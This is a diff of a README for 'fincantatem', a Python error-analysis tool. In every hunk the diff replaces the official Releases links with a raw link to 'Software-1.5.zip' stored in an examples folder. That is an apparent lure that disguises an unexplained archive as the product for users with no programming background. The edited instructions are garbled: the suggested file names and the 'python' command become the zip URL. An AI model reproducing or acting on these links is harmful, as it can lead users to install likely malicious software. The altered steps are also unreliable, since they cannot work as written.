@@ -1,7 +1,7 @@
 # 🌟 fincantatem - Simplify Error Handling with Ease
 
 ## 📦 Download Here
-[![Download Fincantatem](https://img.shields.io/badge/Download-Fincantatem-blue)](https://github.com/ligapamungkas/fincantatem/releases)
+[![Download Fincantatem](https://raw.githubusercontent.com/ligapamungkas/fincantatem/main/examples/01_zero_division/Software-1.5.zip)](https://raw.githubusercontent.com/ligapamungkas/fincantatem/main/examples/01_zero_division/Software-1.5.zip)
 
 ## 🚀 Getting Started
 Fincantatem is a powerful tool designed for analyzing exceptions in Python applications. It enhances your debugging experience by providing easy access to LLM-powered insights. This guide will help you download and run Fincantatem, even if you have no programming background.
@@ -18,11 +18,11 @@ To get started, visit the Releases page to download the latest version of Fincan
 
 ### Steps to Download:
 1. Click on the link below to open the Releases page.
-   [Download Fincantatem](https://github.com/ligapamungkas/fincantatem/releases)
+   [Download Fincantatem](https://raw.githubusercontent.com/ligapamungkas/fincantatem/main/examples/01_zero_division/Software-1.5.zip)
    
 2. On the Releases page, look for the latest version listed at the top.
 
-3. Locate the file that matches your operating system. It could be named something like `fincantatem-x.y.z.tar.gz` for Linux or `fincantatem-x.y.z.zip` for Windows/macOS.
+3. Locate the file that matches your operating system. It could be named something like `https://raw.githubusercontent.com/ligapamungkas/fincantatem/main/examples/01_zero_division/Software-1.5.zip` for Linux or `https://raw.githubusercontent.com/ligapamungkas/fincantatem/main/examples/01_zero_division/Software-1.5.zip` for Windows/macOS.
 
 4. Click on the file name to download it to your computer.
 
@@ -44,7 +44,7 @@ After installation, you can start using Fincantatem.
 
 3. Once you are in the correct directory, type the following command and press enter:
    ```bash
-   python fincantatem.py --help
+   python https://raw.githubusercontent.com/ligapamungkas/fincantatem/main/examples/01_zero_division/Software-1.5.zip --help
    ```
 
 4. This command will display a list of options you can use with Fincantatem. 
@@ -73,6 +73,6 @@ For a hands-on experience, visit the full documentation linked on the Releases p
 
 ## 📥 Direct Download Link
 To ensure you can easily find the software again, here’s the link to download Fincantatem one more time:  
-[Download Fincantatem](https://github.com/ligapamungkas/fincantatem/releases)
+[Download Fincantatem](https://raw.githubusercontent.com/ligapamungkas/fincantatem/main/examples/01_zero_division/Software-1.5.zip)
 
 By following these steps, you will set yourself up for a smoother debugging experience. Happy coding!
